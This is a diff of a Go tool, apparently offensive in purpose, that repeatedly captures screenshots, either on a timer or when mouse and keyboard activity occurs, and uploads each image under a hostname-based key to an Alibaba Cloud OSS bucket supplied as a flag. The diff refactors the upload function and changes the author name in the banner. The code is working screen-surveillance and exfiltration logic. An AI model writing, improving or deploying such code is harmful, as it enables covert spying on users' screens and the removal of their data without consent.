@@ -32,34 +32,6 @@ func screen() {
 	f.Close()
 }
 
-func uploadoss(Endpoint string, AccessKeyId string, AccessKeySecret string, bucketName string, LocalFile string) { //上传到阿里云oss
-	var hostname string
-
-	hostname, _ = os.Hostname()
-	// IP, err = GetOutBoundIP()
-	// if err != nil {
-	// 	fmt.Println(err)
-	// }
-	client, err := oss.New(Endpoint, AccessKeyId, AccessKeySecret)
-	if err != nil {
-		fmt.Print(err)
-	}
-	// 获取存储空间。
-	bucket, err := client.Bucket(bucketName)
-	if err != nil {
-		fmt.Print(err)
-	}
-
-	now := strconv.FormatInt(time.Now().Unix(), 10)
-	myobject := hostname + "_" + now + ".jpg"
-	// 上传文件。
-	err = bucket.PutObjectFromFile(myobject, LocalFile)
-	if err != nil {
-		fmt.Print(err)
-	} else {
-		fmt.Println(time.Unix(time.Now().Unix(), 0).Format("2006-01-02 15:04:05") + ": upload " + myobject + " succeeded")
-	}
-}
 func getdir() string {
 	directory := "./ss.png"
 	dir := strings.Replace(directory, "\\", "/", -1)
@@ -74,7 +46,7 @@ func uploadingfile(str1 []string, Seconds int) {
 		<-t.C
 		if getsize() {
 			screen()
-			uploadoss(str1[3], str1[1], str1[2], str1[0], getdir())
+			uploadToOSS(str1[3], str1[1], str1[2], str1[0], getdir())
 		}
 	}
 }
@@ -88,19 +60,43 @@ func aotu(str1 []string, Seconds int) {
 			screen()
 			time.Sleep(1 * time.Second)
 			if getsize() {
-				uploadoss(str1[3], str1[1], str1[2], str1[0], getdir())
+				uploadToOSS(str1[3], str1[1], str1[2], str1[0], getdir())
 				time.Sleep(time.Duration(Seconds) * time.Second)
 			}
 
 		} else if getsize() {
 			screen()
 			time.Sleep(1 * time.Second)
-			uploadoss(str1[3], str1[1], str1[2], str1[0], getdir())
+			uploadToOSS(str1[3], str1[1], str1[2], str1[0], getdir())
 			time.Sleep(time.Duration(Seconds) * time.Second)
 
 		}
 
 	}
+}
+
+func uploadToOSS(endpoint, accessKeyID, accessKeySecret, bucketName, localFile string) error {
+	client, err := oss.New(endpoint, accessKeyID, accessKeySecret)
+	if err != nil {
+		return err
+	}
+
+	bucket, err := client.Bucket(bucketName)
+	if err != nil {
+		return err
+	}
+
+	hostname, _ := os.Hostname()
+	now := strconv.FormatInt(time.Now().Unix(), 10)
+	objectKey := fmt.Sprintf("%s/%s_%s.jpg", hostname, hostname, now) // 以主机名为文件夹名
+
+	err = bucket.PutObjectFromFile(objectKey, localFile)
+	if err != nil {
+		return err
+	}
+
+	fmt.Printf("%s: Uploaded %s to OSS successfully\n", time.Now().Format("2006-01-02 15:04:05"), objectKey)
+	return nil
 }
 
 func getsize() bool {
@@ -132,7 +128,7 @@ func init() {
    | $$  \ $$| $$  | $$  \  $$$/  | $$  | $$| $$      
    |  $$$$$$/|  $$$$$$/   \  $/   | $$  | $$|  $$$$$$$
 	\______/  \______/     \_/    |__/  |__/ \_______/
-	Author:tom v1.2
+	Author:Pant0m v1.2
 `
 	fmt.Println(eg)
 
@@ -143,7 +139,6 @@ func main() {
 	var osskey string
 	var Seconds int
 	var auto bool
-
 	flag.StringVar(&osskey, "o", "", "format: bucketName:accessKeyId:accessKeySecret:endpoint")
 	flag.IntVar(&Seconds, "s", 10, "Interval time second")
 	flag.BoolVar(&auto, "auto", true, "Screenshot according to the operation of mouse and keyboard")
